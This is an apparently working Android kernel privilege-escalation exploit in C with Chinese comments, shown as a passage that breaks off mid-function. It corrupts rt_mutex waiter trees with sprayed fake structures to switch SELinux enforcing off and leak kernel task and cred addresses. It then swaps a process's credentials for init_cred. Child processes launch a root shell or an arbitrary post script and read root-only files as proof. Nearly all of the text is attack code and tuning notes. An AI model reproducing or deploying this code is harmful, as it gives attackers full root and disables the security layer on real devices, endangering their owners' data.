static uintptr_t CTL_ADDR = 0xffffffc012994970UL;   /* `.data` 字段本身的链接期地址 */
static volatile int h_want;                      /* 0=LEAK 载荷, 1=相位>=1 的写载荷 */
static volatile uintptr_t h_S;                   /* 第 1 发泄漏出来的 S */
static int FOPS_WORD = 40;                       /* 假 fops 摆在窗口的第几字(0 基) */
static uintptr_t TASK;                           /* 泄漏出来的"我们自己的 task_struct"运行时地址 */
/* ★ init_cred 的**运行时地址实测值**(2026-09-28 sen19 的教训): 拿链接期 init_cred+slide 去填
 *   task->cred, 结果 W 自报 getuid()=-118(geteuid()=0) ⇒ **写是落对了槽, 值却不是能用 cred**。
 *   所以不再靠 .rela 算, 改成从窗口里**量出来**: 窗口内所有"形状像 task_struct"的对象, 它们的
 *   cred 槽(+0x848)取**众数** —— 内核线程几百条全共享同一个 cred = init_cred, 用户进程各用各的
 *   ⇒ 众数一定是那个 root+全 caps 的 cred。见 sla_child_scan 的 (B) 段。 */
static uintptr_t ICRED;                          /* 实测 init_cred(众数); 0 = 没量到 */
static uint64_t IC_CNT, IC_N2, IC_V2;             /* 众数出现次数 / 第二名的值与次数 */
/* ===== "sen" = selinux-enforcing-off 端到端模式(2026-09-28) =====
 * 相1  形状(2): selinux_state 整字 ← __log_buf 内部地址 ⇒ enforcing=0(enabled/initialized 留真)
 *      判据 = /sys/fs/selinux/enforce 读回 '0'(**直接读我们写进去的那一字节** ⇒ 不是盲赌)
 * 相1 之后 = tracefs kprobe 泄漏(能写 kprobe_events 本身就是"MAC 真没了"的行为级正对照)
 *      ⇒ 拿到 main 自己的 task 和 **task->cred 的运行时地址** CRED
 * 相2..5 形状(1) 纯零写: 依次清 cred 的 +4..+27(= uid,gid / suid,sgid / euid,egid / fsuid,fsgid)
 *      每发的判据 = /proc/self/status 的 Uid:/Gid: 里对应那一栏变成 0 ⇒ **动态地址上的逐发自校验**
 * 相6  收口: 不再 punch, 只 fork 孩子 exec `id` 举证 + (xroot) 用 core_pattern 管道 helper
 *      拿到"内核亲自以 uid 0 + 全 caps 执行我们的脚本"。 */
static int SENOFF = 0;
static int DIAG = 0;   /* "diag" = 只打自检相(动态地址写通道双向可见), 不碰 cred */
/* ★ "twin" = 差分诊断(2026-09-28): 相3 那一发六次里死了五次 ⇒ 不是运气, 是系统性问题。
 *   两笔写里只有一笔是新的: ①`*(task+0x848)=init_cred`(换掉 W 的 cred 指针)
 *   ②配对写 `*(init_cred)=pc`(把 usage+uid 弄脏)。相1 那发同样是形状(2) 却几乎不死,
 *   差别就在 ①的目的地的语义。**孪生弹**保留 ②、去掉 ①:
 *   目的改成带内一个我们不用的字(S-0x40), 值仍然 = init_cred ⇒ 配对写照样盖 IC。
 *   ⇒ 死了 = ②(把 init_cred 的头 8 字节当节点颜色域用)才是杀手; 活着 = ①(换 cred)才是杀手。 */
static int TWIN = 0;
static uintptr_t DIAG_Z1, DIAG_Z2;
static int MARKD = 0;
static int PH2 = 1;                    /* ph2=0 ⇒ 相1(permissive)+零风险泄露做完就停, 不再打第二笔 */               /* 相2 泄露到手后做"标记-差分": 找窗口里随我们动作变化的槽 */
static void marker_experiment(void);
/* 上一轮 sen 没能走完时(状态记在 /data/local/tmp/ghost_sen_state), 下一轮该怎么办:
 *   0 = 默认: **不重复**改那个布尔(避免把同一个字节改来改去), 只做相1 这一笔
 *   1 = "senresume": 上轮是在**已经拿到 permissive 之后**才停的(2..5/19) ⇒ 允许重打
 *       enforcing(幂等: 同一个值再写一遍), 然后重新漏 cred 把 id 补齐
 *   2 = "senredo": 连 enforcing 都不再打, 只跑到相1 就收(纯粹再看一次判据) */
static int SENREST = 0;
#define SEN_STATE_FILE "/data/local/tmp/ghost_sen_state"
/* sen 停在哪一相(0 = 走完): 每次收尾写进 SEN_STATE_FILE, 下一轮开机后先读回来 ——
 * 目的是**不重复改同一个布尔**: selinux_state 那一格里 8 字节中有 5 个是布尔, 改一次要有
 * 硬判据(enforce 读回 0), 但若上一轮已经改过, 再拿同一笔去赌第二次没有新信息 ⇒ 默认不重打。
 *   1..5 = 停在对应相(1 = enforcing 那一笔始终没落地)
 *   19   = enforcing 已生效, 但 kprobe 没漏到 cred
 *   90   = 已拿到 cred 但没带 kids(没举证)  */
static int senfail;
static uintptr_t CRED;                          /* main 的 cred 运行时地址(由 kprobe 漏出) */
/* ★★★ 9/28 的收口路线: `/proc/sla` 的过界读里那张"每任务一条"的表把 **comm → task_struct 地址**
 *   白送给我们(真机 12/12 与独立签名找到的 task 对象对上)。于是:
 *     W 一开始就 `prctl(PR_SET_NAME, w_mark)` 给自己一个**每轮唯一**的 comm ⇒
 *     相3 = 指针写 `*(W->cred +0x848) = init_cred`   判据 = **W 自己的 getuid() == 0**
 *     相4 = 指针写 `*(W->real_cred +0x840) = init_cred` 判据 = main 读 `/proc/<W_tid>/status` 的 Uid 归 0
 *     相5 = W 亲生孩子 exec `id` ⇒ uid=0(root) + 全 caps(临时, 重启即复位)
 *   配对写只会把 `init_cred.usage` 改成一个核指针大小的数 ⇒ refcount 永不归零 ⇒ 不会释放(安全)。 */
static volatile int w_uid = -1;                 /* W 自己报告的 getuid()（相3 的判据） */
static volatile int w_euid = -1;
static volatile int w_seq = 0;                  /* W 每报告一次 +1 ⇒ main 等"这一发之后"的那次报告 */
static char m_mark[24] = "";
static char w_mark[24] = "";                    /* W 的 comm 标记（找 task 用） */
static uintptr_t TASK;                          /* W 的 task_struct 运行时地址 */
/* 写目标 T 在 init_uts_ns 内的偏移。**只能是 0x08** —— 那是十一次复现验证过的落点。
 * 2026-09-30 试过挪到 nodename(uts+0x50)，动机是 artd 里 `Check failed: strcmp(uts.sysname,"Linux")`
 * 比的是 C 字符串(raw 0..8)，理论上只要不碰那 9 字节就行。
 * **结果是 ~40 秒内设备重启、本轮没拿到 root** ⇒ 我那时"四个槽全零所以遍历会终止"的推导是错的；
 * 而且本文件旧注释里 "*(T+0x40)=sysname 尾=0" 与实测布局自相矛盾 —— 别再拿注释当依据。
 * 要重做这件事: 先读 rb_add_cached 的反汇编，把"哪些偏移会被解引用、哪个是 prio 比较键"钉死，再挑落点。
 * `tg=` 仍可覆盖，用于一次性实验。 */
static int LK_OFF = 0x20, TG_OFF = 0x08;   /* 假lock / 写目标T 在 init_uts_ns 内的偏移 */
static int PEEK = 0;
static int DIRECT = 0;
static long TGT_ABS = -1;
static long LK2_OFF2 = 0x54;                   /* hole2 在 init_uts_ns 内的偏移(第 2 块干净洞) */
static long XABS = 0xffffffc01292e200L + 0x6a8; /* 相2 的 rb_right: X+0x10 = init_task.tasks.prev */
static long RD_LOCK[2] = { 0x58, 0xa8 };   /* 两组干净洞里的 8 对齐假 rt_mutex(落点 = +0x10) */
/* 相1 要写进 selinux_state 的那个"值"必须同时满足:
 *   (a) (V>>8)&0xff == 0  ⇒ 字节1 = enforcing = 0(这就是我们要的效果)
 *   (b) V&0xff != 0       ⇒ 字节0 = initialized 保持"真"(9/27 那次整字清零把 +0 也清了,
 *                          下一个 deref state->policy 的路径就空指针死在 main 手里)
 *   (c) V 本身可被内核写(配对的 写② 要往 *(V) 落一笔)且除了我们没人碰
 * 一开始想用"W 内核栈里的死帧槽", 但那要求地址的低 16 位 ∈ [8,0x100) —— 沿栈往下扫要
 * 扫 48 KB 才可能碰到一个(栈只有 16 KB)⇒ 必然找不到(2026-09-27 run_perm1 就是这么收工的)。
 * ⇒ 现成的解就在目标自己身上: **selinux_state 是页对齐的** ⇒ 它的 +0x08..+0xf8 这一段
 *   低 16 位都 < 0x100 ⇒ 取 **V = selinux_state + 8**:
 *     写①: *(state+0) = state+8  ⇒ 字节0=08(真) 字节1=00(enforcing 没) 字节2..7 = policycap(非零=授权, 无害)
 *     写②: *(state+8) = (state-8)|1 ⇒ 落在 policycap 尾部/对齐填充(+0x10 的 policy 指针**不碰**)
 *   两笔都幂等(每发打的都是同一个值)⇒ 同一颗幽灵可以反复打这一相。 */
static uintptr_t sel_val(uintptr_t S) {
  (void)S;
  return (uintptr_t)(LK_SELINUX_STATE + SLIDE + 8);
}

static int RDPH = 2;                           /* 哪一相做 rb_next 读 */
static int PRIMEPH = 1;                        /* 哪一相预置 leftmost */                      /* 绝对(链接期)写目标 T, 覆盖 tg= 偏移; 用于把 S 直接漏进 .bss 指针里 */                     /* 第一发就是 DST 写(不先泄漏 S, val 用绝对地址) */                       /* 只 dump 运行时 init_uts_ns(不打 punch) */
static int WCPU = -1, MCPU = -1;              /* 钉核: 减少 W 所在核上的异常/迁移, 提高单发存活率 */
static void pin_to(int cpu) {
  if (cpu < 0) return;
  for (int k = 0; k < 16; k++) {
    int c = (k % 2) ? (cpu - (k + 1) / 2) : (cpu + k / 2);   /* cpu, cpu-1, cpu+1, cpu-2, ... */
    if (c < 0) continue;
    cpu_set_t m;
    CPU_ZERO(&m); CPU_SET(c, &m);
    if (sched_setaffinity(0, sizeof m, &m) == 0) {
      if (c != cpu) say("[-] 钉到 CPU%d 失败 ⇒ 退而钉到 CPU%d\n", cpu, c);
      return;
    }
    if (errno != EINVAL) break;                              /* 只有"该核不在线"才值得继续试 */
  }
  say("[-] 钉到 CPU%d 失败 errno=%d\n", cpu, errno);
}
/* ===== "最新 task" 工厂(读相漏出来的是 init_task.tasks.prev = 最后一次 clone 的 task) =====
 * 5.4 的 copy_process 用 `list_add_tail_rcu(&p->tasks, &init_task.tasks)` ⇒ **tasks.prev = 最新**。
 * 于是每次读相 punch 之前 fork 一个孩子, 漏到的地址就大概率是我们这个孩子。
 * 只增不杀: 杀掉孩子会让它的 task_struct 回到 slab, 而我们之后还要往那地址写 cred ⇒ 必须避免。
 * 全部孩子阻塞在 kid_cmd 管道; 收尾时写 N 字节把它们放出去 exec /system/bin/sh 跑 `id`,
 * 输出走 kid_out 管道回到我们的日志 ⇒ 谁的 task 被改成 init_cred, 谁就打印 uid=0(root)。 */
#define MAXKID 48               /* 两个读相 × 每相 18 发 ⇒ 留够余量(只增不杀) */
static int kid_cmd[2] = { -1, -1 }, kid_out[2] = { -1, -1 };
static pid_t kids[MAXKID];
static int nkid = 0, KIDS = 0, SELI = 0, XROOT = 0;
/* mode 词 `shell`: 举证孩子**不动管道**, 直接继承 adb 会话的 fd0/1/2 去 exec sh。
 * ⇒ 自动化跑(auto.py 抓 stdout)时它只是一串 root 命令; 真人在 `adb shell` 终端里手跑时
 *   `[ -t 0 ]` 成立 ⇒ 交还是一个挂在会话上的交互式 root shell(全程不落盘、不装东西)。 */
static int SHELLMODE = 0;
static int ISHELLMODE = 0;              /* `ishell`: 额外 —— 若 stdin 真是 tty 就交还交互式 sh */
/* `post=<脚本>`: 举证跑完紧接着以 root 执行这个脚本 —— 给"app 自己重打"用
 * (没有它就得靠 ishell 的 tty 交接, 而 app 侧只有 socket, 拿不到 tty)。 */
static const char *POSTSH = NULL;
static volatile int v_shellpid = 0;
static int KID_SHOTS = 18;              /* 每个读相最多抢多少次"最新 task" */
static int kid_last = 0;                /* 上一发用的孩子下标(只为日志) */
static void kids_init(void) {
  if (pipe(kid_cmd) || pipe(kid_out)) { say("[-] pipe 失败 errno=%d\n", errno); return; }
}
/* 孩子本体: 只做事后需要的三步 —— 接管道、挂起等信号、被放行后 exec。
 * ★ 这里绝对不能用 malloc/printf/fork 包装(多线程进程里 fork 会走锁), 也不要在
 *   "铺载荷 → punch"之间放任何有开销的东西。 */
/* ★ 全是一手"只有 uid0 才读得到/做得到"的**只读**举证(不改任何系统状态, 不留任何文件):
 *   - /proc/1/environ       : ptrace_may_access(init) + DAC(0700 root)
 *   - /proc/sla/wlan_stats  : SELinux 的 untrusted_app 读不到(它自己 stat 都 EACCES)
 *   - /data/system/packages.xml : 0640 system:system
 *   - 能力集(CapEff)与域(Se) 一起读回 ⇒ 不是"数字伪装" */
#define KID_PROOF \
  "echo KID $$; id; " \
  "echo -n 'init-environ: '; cat /proc/1/environ 2>&1 | head -c 120; echo; " \
  "echo -n 'sla-read: '; head -c 40 /proc/sla/wlan_stats >/dev/null 2>&1 && echo OK || echo NO; " \
  "echo -n 'packages.xml: '; head -c 40 /data/system/packages.xml >/dev/null 2>&1 && echo OK || echo NO; " \
  "echo -n 'getenforce: '; getenforce 2>&1; echo -n 'caps: '; grep -E 'CapEff|Se' /proc/self/status"
static void kid_child(void) __attribute__((noinline));
static void kid_child(void) {
  dup2(kid_out[1], 1);
  dup2(kid_out[1], 2);
  if (kid_out[1] != 1 && kid_out[1] != 2) close(kid_out[1]);
  close(kid_out[0]);
  close(kid_cmd[1]);
  char c;
  if (read(kid_cmd[0], &c, 1) <= 0) _exit(2);
  execl("/system/bin/sh", "sh", "-c", KID_PROOF, (char *)0);
  execl("/system/bin/toybox", "toybox", "sh", "-c", "id", (char *)0);
  dprintf(2, "kid %d: 两个 exec 都失败 errno=%d(多半 SELinux 还是 enforcing)\n",
          (int)getpid(), errno);
  _exit(3);
}
/* ★ 举证孩子之外, `shell` 模式再开一个孩子: 它**不动 stdio**, 直接继承拉起本程序的那个
 *   adb 会话 ⇒ 真人 `adb shell` 手跑时它就是一个交互式 root shell;
 *   自动化(管道)跑时 `[ -t 0 ]` 不成立 ⇒ 只跑一遍举证就退出, 不会把流程卡住。 */
static void shell_child(void) __attribute__((noinline));
static void shell_child(void) {
  /* 不 dup2、不碰 fd 0/1/2: 它们就是拉起本程序的那个 adb 会话 */
  static char cmd[4096];
  if (ISHELLMODE && isatty(0))
    execl("/system/bin/sh", "sh", "-c",
          KID_PROOF "; echo '[SHELL] stdin 是 tty ⇒ 交还交互式 root sh(退出即随重启失效)'; exec /system/bin/sh",
          (char *)0);
  if (POSTSH) {
    snprintf(cmd, sizeof cmd, KID_PROOF "; echo '[POST] sh %s'; sh %s", POSTSH, POSTSH);
    execl("/system/bin/sh", "sh", "-c", cmd, (char *)0);
  }
  execl("/system/bin/sh", "sh", "-c", KID_PROOF, (char *)0);
  _exit(4);
}
/* ★ 用**裸 clone**而不是 bionic 的 fork(): fork() 在子分支里会跑 pthread_atfork 处理器
 *   (拿所有锁、重建信号屏蔽, 约 1~2us), 会把"我们的孩子成为 tasks.prev"的窗口挤掉;
 *   裸 svc clone 只多花一次进入内核的时间, 且孩子不复制父线程的栈帧(它从同一 PC 继续跑)。 */
static void kid_new(void) {
  if (nkid >= MAXKID) return;
  long r = syscall(SYS_clone, (long)SIGCHLD, 0L, 0L, 0L, 0L);   /* = fork 语义, 但绕过 atfork 处理器 */
  if (r == 0) kid_child();                       /* 孩子: 不返回 */
  if (r > 0) kids[nkid++] = (pid_t)r;
}
/* 收尾: 放孩子去 exec, 并把它们写的东西捞进日志(最多等 ~4s, 非阻塞轮询) */
static int kid_saw_root = 0;            /* 捞回的字节里出现过 `uid=0(root)` ⇒ 临时 root 的凭证 */
static void kids_release_and_read(void) {
  if (nkid <= 0) { say("[k] 没有孩子(没用 kids) ⇒ 不提权验证\n"); return; }
  say("[k] 放 %d 个孩子去 exec(被改过 cred 的那个应当报 uid=0)\n", nkid);
  close(kid_out[1]); kid_out[1] = -1;
  for (int i = 0; i < nkid; i++) { ssize_t w = write(kid_cmd[1], "x", 1); (void)w; }
  int fl = fcntl(kid_out[0], F_GETFL, 0);
  fcntl(kid_out[0], F_SETFL, fl | O_NONBLOCK);
  char buf[2048];
  int got = 0, idle = 0;
  while (idle < 40) {
    ssize_t n = read(kid_out[0], buf, sizeof buf - 1);
    if (n > 0) {
      buf[n] = 0; got += (int)n; say("[KID>out] %s", buf); idle = 0;
      if (!kid_saw_root && strstr(buf, "uid=0(root)")) {
        kid_saw_root = 1;
        say("[KID>out] ★★★ 内核亲自给了这个孩子 uid=0(root) ⇒ **临时 root 到手**\n");
      }
    }
    else { idle++; usleep(100000); }
    if (n == 0) break;
  }
  say("[k] 共捞回 %d 字节; 出现 `uid=0(root)` 即为临时 root 成功\n", got);
  for (int i = 0; i < nkid; i++) kill(kids[i], SIGKILL);
}
static int HAMMER = 0;
static int MAX_ROUNDS = 8;
static long H_MAX = 200000;

/* ===== DIAG 相的载荷: 同一颗幽灵、同一个形状(2), 只是目的换成"窗口内读得回来的干净页" =====
 * 目的 = Z1(或 Z2), 值 = Z2(或 Z1) ⇒ 应当产生两笔可见写:
 *   *(dst) = val        (str x9,[x8,#8])
 *   *(val) = dst - 8    (str x10,[x9])   ← 配对那笔也落在同一对干净页里 ⇒ 零副作用
 * 其余字段与 sen 相完全一致(假 lock 仍在带内 S+0x60, task 仍是 init_task, prio 仍是 119)。 */
static void spray_diag(void) {
  int ph = __atomic_load_n(&h_phase, __ATOMIC_ACQUIRE);
  uintptr_t S = h_S;
  if (!S) { say("[-] DIAG 相没有 S(泄漏相没跑) ⇒ 不铺\n"); return; }
  if (!DIAG_Z1 || !DIAG_Z2) { say("[-] DIAG 相没有靶子(两个干净零页没找到) ⇒ 不铺\n"); return; }
  uintptr_t dst = (ph == 3) ? DIAG_Z1 : DIAG_Z2;
  uintptr_t val = (ph == 3) ? DIAG_Z2 : DIAG_Z1;
  for (int i = 0; i < 0x200 / 8; i++) p64(FRM, SR_FB + 8 * i, 0);
  uint64_t s2[10];
  s2[0] = dst - 8; s2[1] = val; s2[2] = 0;
  s2[3] = (uint64_t)(S + 0x18); s2[4] = 0; s2[5] = 0;
  s2[6] = LK_INIT_TASK + SLIDE; s2[7] = (uint64_t)(S + 0x60); s2[8] = (uint64_t)WP_PRIO; s2[9] = 0;
  for (int j = 0; j < 10; j++) p64(FRM, SR_FB + 8 * (WAITER_WORD + j), s2[j]);
  static int logged;
  if (!logged) {
    logged = 1;
    say("[DIAG] 载荷(形状2): 目的=%016lx 值=%016lx 配对目的=%016lx 假lock=%016lx prio=%d\n",
        (unsigned long)dst, (unsigned long)val, (unsigned long)val, (unsigned long)(S + 0x60), WP_PRIO);
  }
}
static void spray_build(uintptr_t target) {
  static long spray_nr;
  if (DIAG && (h_phase == 3 || h_phase == 4)) {   /* 自检相: 打干净零页, 两笔写都读得回来 */
    spray_diag();
    return;
  }
  const int verbose = (spray_nr < 2);
  spray_nr++;
  memset(FRM, 0, 0x4000);
  p64(FRM, 0x80, 0); p64(FRM, 0x88, 0);
  p64(FRM, 0x90, (uintptr_t)(FRM + 0x3000));     /* ss_sp */
  p64(FRM, 0x98, 2);                             /* ss_flags = SS_DISABLE */
  p64(FRM, 0xa0, 0x1000);
  p32(FRM, SR_RES + 0, 0x46508001u);             /* FPSIMD_MAGIC */
  p32(FRM, SR_RES + 4, 0x210u);                  /* size 必须恰好 0x210 */
  /* 平铺探针: 0x50(=80, 8 的倍数) 为一个周期, 把整个 0x200 窗口铺满同一个假 waiter。
   * ⇒ 只要真实 waiter 的起点落在窗口内(深度误差多少都无所谓), 链走读到的就是合法载荷;
   *    跑通即证明"通道成立 + 拿到了 S", 再由 S 反推真实深度误差。 */
  uint64_t w[10];
  if (FILL_PROBE) {
    /* 全区基础填"实测 p->prio"(⇒ [3] 早退 ⇒ 存活); 探针区填 prio-1(不等 ⇒ 继续走,
     * 而此时 lock 字段读到的是小整数 ⇒ 解引用必炸)。
     * ⇒ 炸 ⇔ 真 prio 字 ∈ 探针区。这是**单比特且两种结局都有意义**的判据。
     * 前提(9/27 反汇编 rt_mutex_adjust_pi@0x10377ac0 坐实): 整条 punch 路径里
     * 第一次碰幽灵的就是这条比较 `ldr w10,[x8,#0x40]` vs `ldr w9,[task,#0xb4]`,
     * 之前 __sched_setscheduler 只读 pi_top_task(0x938) 不读 pi_blocked_on ⇒ 判据干净。 */
    if (!PROBE_MATCH_SET) {
      long mp = read_prio(p_tid);
      if (mp > 0) { PROBE_MATCH = (uint64_t)mp; PROBE_POISON = (uint64_t)mp - 1; }
      say("[P] 实测 prio=%ld ⇒ 基础值=%llu 探针值=%llu\n", mp,
          (unsigned long long)PROBE_MATCH, (unsigned long long)PROBE_POISON);
    }
    for (int i = 0; i < 0x200 / 8; i++) {
      uint64_t v = (i >= PROBE_LO && i < PROBE_LO + PROBE_N) ? PROBE_POISON : PROBE_MATCH;
      p64(FRM, SR_FB + 8 * i, v);
    }
    say("[P] 探针: 字 [%d,%d) = %llu(毒), 其余 %llu; 共 %d 字\n",
        PROBE_LO, PROBE_LO + PROBE_N, (unsigned long long)PROBE_POISON,
        (unsigned long long)PROBE_MATCH, 0x200 / 8);
    return;
  }
  w[0] = 0;                              /* tree.pc  = NULL parent */
  w[1] = target;                         /* tree.right = 写目标 T   */
  w[2] = 0;                              /* tree.left  */
  w[3] = 0; w[4] = 0; w[5] = 0;          /* pi_tree(本路径不解引用) */
  w[6] = LK_INIT_TASK + SLIDE;           /* task (rb_entry 偏移 0 ⇒ 不能为 0) */
  w[7] = FAKE_LOCK;                      /* lock = init_uts_ns 零洞里的假 rt_mutex */
  w[8] = (uint64_t)WP_PRIO;              /* prio=119 ⇒ 不等 120 ⇒ 继续走到 [7] */
  w[9] = 0;                              /* deadline */
  if (HIJACK && h_want == 1) {
    /* 相 >=1: 幂等写, **假 lock 搬进带内** ⇒ 每一轮 rt_sigreturn 重铺都顺手把它清零
     * ⇒ "一个 boot 只能吃一发"的限制从根上解除(旧的"一发一用"是因为 uts 那块零洞是静态的,
     *   打完就永久脏了)。
     * ★ 两个必须守住的不变量(9/27 第 2 发 panic 的两处成因):
     *   (1) 假 lock 要留给 `struct rt_mutex` 完整的 ~0x80 字节 ⇒ 放 S+0x60(节点只有 0x50,
     *       放在 S-0x48 只剩 0x48, lock 尾部会溢出到节点自己的字上);
     *   (2) `waiter->pi_tree` 必须是内核"空节点"约定 `pc == &pi_tree`(=S+0x18), 不能是 0,
     *       否则链走走到的 `rt_mutex_dequeue_pi` 会对一棵它以为是"真树"的树做 rb_erase,
     *       而该树 root=0 ⇒ `rb_recolor(child=0, parent=0)` = **往 NULL 写** ⇒ panic。
     * 同理 `tree.pc` 必须 != S(否则 RB_EMPTY_NODE ⇒ rt_mutex_dequeue 直接返回, 写不发生)。 */
    uintptr_t S = h_S;
    if (!S && !(DIRECT && VAL_ABS >= 0)) { say("[-] hijack 但还没有 S\n"); return; }
    if (!S) S = LK_INIT_UTS + SLIDE;         /* direct: S 只当偏移基准, 不参与本次写 */
    /* ===== 相表(2026-09-27 深夜第五版: 先把"读通道"本身验通, 再谈提权) =====
     * 真机连吃三次 panic 换来的三条负结果(详见 analysis/GHOST-LSM-HOOKS-NULLING §7):
     *   (a) selinux_state 那一字**整字清零** ⇒ main 下一个碰 SELinux 的 syscall 就炸;
     *   (b) selinux_state 那一字写成"某个可写内核地址"(byte1=0 ⇒ enforcing=0, byte0=0x40) ⇒ **同样炸**
     *       ⇒ "4 对齐写 + 值必须本身可写"这对约束在 selinux_state 上凑不出安全字节串;
     *   (c) 清 LSM 钩子链头(inode_permission)⇒ 一发就炸(selinux 的 isec 惰性初始化也在那条链上)。
     * ⇒ 停止"盲写赌内容", 先接上**读通道**:
     *   `cmdline_proc_show@0x100be268` = `ldr x1,[adrp(saved_command_line)+0x600]; bl seq_puts`
     *   ⇒ saved_command_line 是 .bss 里的**裸 char\***, 一笔指针写就能把 /proc/cmdline 变成
     *      "从任意内核地址往外印字节, 直到第一个 NUL"; 读本身不改状态 ⇒ 一个 boot 可以反复读。
     * 相1 = **控制相**(avenrun ← 核指针, 看 /proc/loadavg 第一列) ⇒ 判".bss 写生效没有"
     * 相2 = **自洽正对照**(不做任何危险事): 把指针指到**我们自己带内的 S+0x100**, 并在那里铺
     *   'A'..'G'(0x41..0x47, 无 NUL) ⇒ 预期 /proc/cmdline 读回 8+7 = 15 字节:
     *     前 8 字节 = 配对写落下的 pc(= &saved_command_line - 8, **我们早就知道它该等于什么**)
     *     后 7 字节 = "A1CDEFG"
     *   ⇒ 一次跑完同时证实: ①slide 对 ②指针写落对了目的 ③读通道成立 ④带内地址算得准。
     *     **被写坏的那 8 字节是我们自己的载荷槽 ⇒ 零风险。**
     * 相3..9 = 从 S 往下的死帧逐窗印(找 W 的 task_struct 指针)；相10 = 验真；相11/12 = 写 cred；
     * 相13 = 由 W 亲自 fork 孩子举证 uid(见 main 里的说明)。 */
    int ph = h_phase;
    uintptr_t C = 0, P = 0, LV = 0, FLOCK = S + 0x60;
    int shape4 = 0;
    if (SENOFF) {
      /* ===== "sen" 相表(见文件头 SENOFF 那段注释) =====
       * 相1 = 形状(2): 把 selinux_state 的整个 qword0 写成 LK_LOGBUF_HOLE
       *   ⇒ 内存里那 8 字节变成 20 00 b3 12 c0 ff ff ff: enabled 真 / **enforcing 0** /
       *     checkreqprot 真 / initialized 真 / policycap[0..3] 真(全是 bool, 8 字节字段不可能
       *     落在 +4..+7); 配对的第二笔 *(V)=pc 落在 printk 环形缓冲里(只被当字节读) ⇒ 无害。
       * 相2 = 形状(4)(`left=T, right=0, pc=F`): `*(T)=F` 把 ashmem_misc.fops 顶成**带内的伪
       *   file_operations**; 第二笔 `*(F&~3+8)=T` 落在伪 fops 的 `.llseek` 槽 ⇒ 我们不用 lseek,
       *   无害。(为什么用形状(4) 而不是 (2): 形状(2) 的第二笔一定落在 `*(F)`= 伪 fops 的
       *   `.owner` 上 ⇒ fops_get 会 try_module_get(垃圾) ⇒ 危险。)
       * 相3..6 = 形状(1) 纯零写(**根本没有第二笔**): 清 main 自己 cred 的 id 字段。
       *   ★ 目的全部 **8 对齐**(不赌"内核没开 SCTLR.A"): dst = cred+0 / +8 / +0x10 / +0x18,
       *     即 pc = dst-8 = cred-8 / cred / cred+8 / cred+0x10。四发覆盖
       *     [usage,uid][gid,suid][sgid,euid][egid,fsuid] —— 只多清了一个 `usage`
       *     (refcount 归 0 ⇒ put_cred 永远不释放 = 只泄漏不炸), 而 `cred->security`(+0x24)
       *     和 `fsgid`(+0x20) **留在原地不动**(不碰 lsm blob 指针)。
       * 相7 = 收口(不 punch)。 */
      LEAK_FOPS_ADDR = S + 8 * (uintptr_t)FOPS_BASE_WORD - 0x48;      /* = S+0x100 */
      if (ph == 1) {
        P = LK_SELINUX_STATE + SLIDE - 8;
        C = LK_LOGBUF_HOLE + SLIDE;
      } else if (ph == 2 && TWIN) {
        /* 孪生弹: dst = 带内第 1 字(S-0x40; 我们的 waiter 副本从第 9 字起 ⇒ 这一格是我们自己的),
         * val = init_cred ⇒ 第二笔 `*(IC)=pc` 与相3 **一字不差**, 只是不动 task->cred。 */
        P = S + 8 - 0x48;
        C = ICRED;
        LV = 0;
      } else if (ph == 2) {
        shape4 = 1;
        P = LEAK_FOPS_ADDR;                            /* pc = F = 伪 fops 基址 */
        LV = LK_ASHMEM_MISC + SLIDE + ASH_FOPS_OFF;    /* left = T = 要写的目的 */
        C = 0;                                         /* right = 0 */
      } else if (ph == 3 || ph == 4 || ph == 5 || ph == 6) {
        /* ===== 提权四发(2026-09-28 sen19/20/21 反推出的**必要**序列) =====
         * (2) 指针写的完整效果是 `*(dst)=val` **且** `*(val)=dst-8`(DIAG 自检相两笔都读回来过)。
         * 把 val 选成 init_cred ⇒ 第二笔把 8 字节 `pc = dst-8` 盖进 `*(IC)` = `usage`(低4)+`uid`(高4)
         * ⇒ W 的 getuid() 立刻变成 `(dst-8)>>32`(sen19 实测 -118 = 0xFFFFFF8A =
         * TASK=0xffffff8a2ebbe900 那一轮 `TASK+0x840` 的高 32 位, **逐位吻合** ⇒ 地址、几何、
         * 落地三件事同时被这一个数钉死)。⇒ **每一发指针写后面必须紧跟一发纯零写补 uid**:
         *   相3 cred←IC → 相4 零写 IC+4(还原 uid/gid, **完全不动 usage**)
         *   相5 real_cred←IC → 相6 零写 IC+4
         * 纯零写 = 形状(1)(right=0 ⇒ `cbz x9` 跳过第二笔 ⇒ 这一发没有任何额外副作用、幂等可重打)。
         * 打 IC+4 而不是 IC+0: 非对齐 8 字节 store 本机实测可用(9/27 往 uts+0x64 写真落地过),
         * 而 IC+0 会把 usage 一起清 0 —— 虽然本机是带检测的饱和 refcount(kallsyms 里有
         * `refcount_*_checked` ⇒ CONFIG_REFCOUNT_FULL=y, 0 永远回不到 1 ⇒ 不会误释放),
         * 但没必要赌。⇒ 前两发就足够让 W 变 root(getuid/geteuid/getgid/capable 全走 cred)。 */
        if (DIAG) {            /* 自检相: 打两页整页为 0 的干净页, 写完全用同一个映射读回来 */
          if (!DIAG_Z1 || !DIAG_Z2) { say("[-] DIAG 相没有靶子(零页没找到)\n"); return; }
          if (ph == 3) { P = DIAG_Z1 - 8; C = DIAG_Z2; }
          else if (ph == 4) { P = DIAG_Z2 - 8; C = DIAG_Z1; }
          else if (ph == 5) {
            /* DIAG 相5 = 单独钉死"**非对齐**纯零写"这一格(提权补刀正好依赖它):
             * 相4 之后 *(Z1)=Z2-8; 这一发 pc=Z1-4(`pc&~3` 仍是 Z1-4 ⇒ 落点 = Z1+4)
             * ⇒ 清掉 Z1+4..Z1+11 ⇒ 预言 `*(Z1) == (Z2-8)&0xFFFFFFFF`。打干净页 ⇒ 零风险。 */
            P = DIAG_Z1 - 4; C = 0; LV = 0;
            say("[W] sen 相5(DIAG 非对齐纯零写): 落点=%016lx(非 8 对齐) 预言读回 *(Z1)=%016llx\n",
                (unsigned long)(P + 8), (unsigned long long)((uint64_t)(DIAG_Z2 - 8) & 0xffffffffULL));
          } else { say("[DIAG] 相6 不用打 ⇒ 收工\n"); return; }
        } else if (!TASK || (USEMAIN && !MTASK)) {
          say("[-] 相%d 需要 TASK(还没认出自己的 task_struct)\n", ph);
          return;
        } else if (!ICRED) {
          say("[-] 相%d 需要 ICRED ⇒ 不发, 不盲打\n", ph);
          return;
        } else if (ph == 3 || ph == 5) {
          P = (USEMAIN ? MTASK : TASK) + (ph == 3 ? TASK_CRED_OFF : TASK_RCRD_OFF) - 8;
          C = ICRED;   /* = LK_INIT_CRED + SLIDE(同构建 kallsyms 逐字核对 + 正对照 slide) */
        } else {
